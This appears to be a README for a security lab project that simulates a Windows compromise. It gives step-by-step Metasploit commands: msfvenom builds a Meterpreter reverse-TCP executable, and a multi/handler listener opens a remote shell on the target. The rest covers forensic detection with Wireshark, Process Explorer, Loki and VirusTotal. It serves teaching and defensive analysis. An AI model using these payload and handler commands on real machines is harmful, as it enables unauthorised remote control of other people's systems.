# Data-Compromise-Assessment
This project demonstrates a simulated cyberattack covering:  Payload delivery (initial intrusion)  Reverse shell (C2 communication)  Forensic analysis (process &amp; network behavior)  Includes tools and techniques used to detect and analyze real-world breaches. 

Objective:
To simulate and analyze a data compromise using ethical hacking techniques, forensic tools, and threat intelligence to detect and assess malicious activity on a Windows machine.

Step 1: Create the Payload
Open terminal and run:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST= Host Machine IP LPORT= Host Machine Port -f exe -o testPayload.exe

Step 2: Start Metasploit Handler
Open another terminal and run:
msfconsole

Inside Metasploit:
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost (Host Machine IP)
set lport (Host Machine Port)
exploit

Step 3: Run Payload on Windows
Copy and run testPayload.exe on the target Windows machine.
You should get a Meterpreter session in Kali.

Step 4: Run Basic Commands
From the Meterpreter shell:
whoami
ipconfig
help
exit

Step 5: Analyze the Attack

1. Open Wireshark:
   - Capture traffic on the network
   - Look for reverse shell traffic to LPORT

2. On Windows, open Process Explorer:
   - Look for suspicious processes (testPayload.exe)

3. Use loki scanner:
   - Scan the system for signs of compromise

4. Go to https://virustotal.com
   - Upload Pyload.exe file or paste the hash
   - Check if it's detected as malicious

This simulation shows:
- Initial intrusion (payload)
- Command and control (reverse shell)
- Forensic footprint (network + process analysis)
